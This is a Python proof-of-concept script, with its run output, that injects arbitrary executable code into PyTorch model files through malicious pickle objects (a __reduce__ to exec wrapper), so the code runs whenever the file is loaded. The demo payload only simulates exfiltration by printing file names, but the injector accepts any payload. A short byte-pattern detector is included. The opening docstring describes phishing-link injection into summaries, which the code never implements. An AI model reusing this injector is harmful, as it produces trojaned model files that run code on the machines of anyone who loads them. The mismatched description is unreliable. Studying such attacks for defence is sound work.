"""
Compromising a model to steal private user data.
For summarizer applications or searches, using a malicious pickle file that hooks the model’s inference function and
adds malicious links to the summary it generates. When altered summaries are returned to the user, they are likely to
click on the malicious links and potentially fall victim to phishing, scams, or malware.

"""

import io
import pickle
import sys
from pathlib import Path
import zipfile
import struct

import torch
import torch.nn.functional as F
from torch import nn


# Define model
class TheModelClass(nn.Module):
    def __init__(self):
        super().__init__()
        self.conv1 = nn.Conv2d(3, 6, 5)
        self.pool = nn.MaxPool2d(2, 2)
        self.conv2 = nn.Conv2d(6, 13, 5)
        self.fc1 = nn.Linear(16 * 5 * 5, 120)
        self.fc2 = nn.Linear(120, 84)
        self.fc3 = nn.Linear(84, 10)

    def forward(self, x):
        x = self.pool(F.relu(self.conv1(x)))
        x = self.pool(F.relu(self.conv2(x)))
        x = x.view(-1, 16 * 5 * 5)
        x = F.relu(self.fc1(x))
        x = F.relu(self.fc2(x))
        x = self.fc3(x)
        return x


# Simple class to mimic some of the PyTorchModelWrapper functionality
class SimplePyTorchModelWrapper:
    def __init__(self, path):
        self.path = Path(path)
        self.is_safe = True

    def inject_payload(self, payload_code, output_path, injection="insertion"):
        """Inject payload into PyTorch model file"""
        output_path = Path(output_path)

        # Check the file format
        with open(self.path, 'rb') as f:
            magic = f.read(2)

        if magic == b'PK':  # ZIP file format
            self._inject_into_zip(payload_code, output_path)
        else:  # Legacy pickle format
            self._inject_into_pickle(payload_code, output_path)

        print(f"Created PyTorch exfiltration exploit payload PoC {output_path.absolute()!s}")
        self.is_safe = False
        return SimplePyTorchModelWrapper(output_path)

    def _inject_into_zip(self, payload_code, output_path):
        """Inject payload into PyTorch model saved as ZIP"""
        # Read the original zip file
        with zipfile.ZipFile(self.path, 'r') as zin:
            # Check for pickle data in various possible locations
            pickle_files = []
            for name in zin.namelist():
                if name.endswith('.pkl') or 'data.pkl' in name:
                    pickle_files.append(name)

            if not pickle_files:
                # If no pickle file found, look for the model data
                for name in zin.namelist():
                    if 'archive/' in name and not name.endswith('.py'):
                        pickle_files.append(name)

            # Create a new zip file
            with zipfile.ZipFile(output_path, 'w', zipfile.ZIP_DEFLATED) as zout:
                # Copy all files from original zip
                for item in zin.infolist():
                    if item.filename in pickle_files:
                        # This is a pickle file - modify it
                        with zin.open(item.filename) as f:
                            original_pickle_data = f.read()

                        # Create malicious pickle data
                        modified_pickle_data = self._create_malicious_pickle(original_pickle_data, payload_code)
                        zout.writestr(item, modified_pickle_data)
                    else:
                        # Copy other files unchanged
                        with zin.open(item.filename) as f:
                            zout.writestr(item, f.read())

    def _inject_into_pickle(self, payload_code, output_path):
        """Inject payload into legacy PyTorch model (direct pickle)"""
        with open(self.path, 'rb') as f:
            original_pickle_data = f.read()

        modified_pickle_data = self._create_malicious_pickle(original_pickle_data, payload_code)

        with open(output_path, 'wb') as f:
            f.write(modified_pickle_data)

    def _create_malicious_pickle(self, original_pickle_data, payload_code):
        """Create malicious pickle data that executes payload during unpickling"""

        # Method 1: Try to wrap the original data with a malicious class
        try:
            # Try to unpickle the original data
            original_data = pickle.loads(original_pickle_data)

            # Create a wrapper class that executes payload
            class MaliciousWrapper:
                def __init__(self, wrapped_data):
                    self.wrapped_data = wrapped_data
                    # Execute payload during __init__
                    exec(payload_code)

                def __reduce__(self):
                    # This ensures the wrapped data is properly restored
                    return (MaliciousWrapper, (self.wrapped_data,))

            # Wrap the original data
            wrapped = MaliciousWrapper(original_data)
            return pickle.dumps(wrapped)

        except Exception as e:
            print(f"Warning: Could not deserialize original pickle: {e}")

            # Method 2: Create a tuple that executes payload during unpickling
            class PayloadExec:
                def __reduce__(self):
                    return (exec, (payload_code,))

            # Create a structure that includes both the payload and original data
            malicious_data = {
                '__proto__': PayloadExec(),
                'original_data': original_pickle_data
            }

            # We need to ensure the original data can be recovered
            # This is a simplified approach - in practice you'd need to be more careful
            return pickle.dumps(malicious_data)


def is_model_safe(model_path):
    """Simple heuristic to check if a model might be unsafe"""
    try:
        with open(model_path, 'rb') as f:
            data = f.read(1024)  # Read first 1KB
            # Look for common malicious patterns
            suspicious_patterns = [b'exec', b'__reduce__', b'subprocess', b'os.system', b'eval(']
            for pattern in suspicious_patterns:
                if pattern in data:
                    return False
        return True
    except:
        return False


def save_model_in_legacy_format(model, path):
    """Save model in legacy format (direct pickle)"""
    with open(path, 'wb') as f:
        pickle.dump(model, f)


if __name__ == "__main__":
    # Initialize model
    model = TheModelClass()

    # Try both save formats to demonstrate
    print("Saving model in modern format (ZIP)...")
    torch.save(model, "pytorch_standard_model.zip")
    print(f"Created {Path('pytorch_standard_model.zip').absolute()!s}")

    print("\nSaving model in legacy format (direct pickle)...")
    save_model_in_legacy_format(model, "pytorch_standard_model.pkl")
    print(f"Created {Path('pytorch_standard_model.pkl').absolute()!s}")

    # Test with the ZIP format first
    print("\n" + "="*60)
    print("Testing with ZIP format model:")
    print("="*60)

    # Load and eval the original model to verify it works
    model = torch.load("pytorch_standard_model.zip", weights_only=False)
    model.eval()
    print("Original model loaded successfully")

    EXFIL_PAYLOAD = (
        "exec(\"import os\\nfor file in os.listdir():\\n    print(f'Exfiltrating {file}')\")"
    )

    # Use our simple wrapper to inject payload
    wrapper = SimplePyTorchModelWrapper(Path("pytorch_standard_model.zip"))
    exfil_model = wrapper.inject_payload(EXFIL_PAYLOAD, Path("pytorch_exfil_poc.zip"), injection="insertion")

    # Simple safety check
    is_safe = is_model_safe("pytorch_exfil_poc.zip")
    sys.stdout.write("Simple safety check classifies this model as unsafe? ")
    if not is_safe:
        print("✅")
    else:
        print("❌")

    print("\nLoading the ZIP model with payload... (you should see simulated exfil messages during the load)")
    print(f"{'=' * 30} BEGIN LOAD {'=' * 30}")
    try:
        loaded_model = torch.load("pytorch_exfil_poc.zip", weights_only=False)
        loaded_model.eval()
        print("Model loaded successfully despite payload")
    except Exception as e:
        print(f"Error during loading: {e}")
    print(f"{'=' * 31} END LOAD {'=' * 31}")

    # Now test with the legacy pickle format
    print("\n" + "="*60)
    print("Testing with legacy pickle format model:")
    print("="*60)

    wrapper2 = SimplePyTorchModelWrapper(Path("pytorch_standard_model.pkl"))
    exfil_model2 = wrapper2.inject_payload(EXFIL_PAYLOAD, Path("pytorch_exfil_poc.pkl"), injection="insertion")

    print("\nLoading the legacy pickle model with payload...")
    print(f"{'=' * 30} BEGIN LOAD {'=' * 30}")
    try:
        with open("pytorch_exfil_poc.pkl", 'rb') as f:
            loaded_model2 = pickle.load(f)
        print("Model loaded successfully despite payload")
    except Exception as e:
        print(f"Error during loading: {e}")
    print(f"{'=' * 31} END LOAD {'=' * 31}")

"""
Saving model in modern format (ZIP)...
Created /content/pytorch_standard_model.zip

Saving model in legacy format (direct pickle)...
Created /content/pytorch_standard_model.pkl

============================================================
Testing with ZIP format model:
============================================================
Original model loaded successfully
Warning: Could not deserialize original pickle: A load persistent id instruction was encountered, but no persistent_load function was specified.
Created PyTorch exfiltration exploit payload PoC /content/pytorch_exfil_poc.zip
Simple safety check classifies this model as unsafe? ✅

Loading the ZIP model with payload... (you should see simulated exfil messages during the load)
============================== BEGIN LOAD ==============================
Exfiltrating .config
Exfiltrating pytorch_standard_model.pkl
Exfiltrating pytorch_standard_model.zip
Exfiltrating pytorch_exfil_poc.zip
Exfiltrating sample_data
Error during loading: 'dict' object has no attribute 'eval'
=============================== END LOAD ===============================

============================================================
Testing with legacy pickle format model:
============================================================
Exfiltrating .config
Exfiltrating pytorch_standard_model.pkl
Exfiltrating pytorch_standard_model.zip
Exfiltrating pytorch_exfil_poc.zip
Exfiltrating sample_data
Warning: Could not deserialize original pickle: Can't get local object 'SimplePyTorchModelWrapper._create_malicious_pickle.<locals>.MaliciousWrapper'
Created PyTorch exfiltration exploit payload PoC /content/pytorch_exfil_poc.pkl

Loading the legacy pickle model with payload...
============================== BEGIN LOAD ==============================
Exfiltrating .config
Exfiltrating pytorch_standard_model.pkl
Exfiltrating pytorch_standard_model.zip
Exfiltrating pytorch_exfil_poc.zip
Exfiltrating pytorch_exfil_poc.pkl
Exfiltrating sample_data
Model loaded successfully despite payload
=============================== END LOAD ===============================

"""    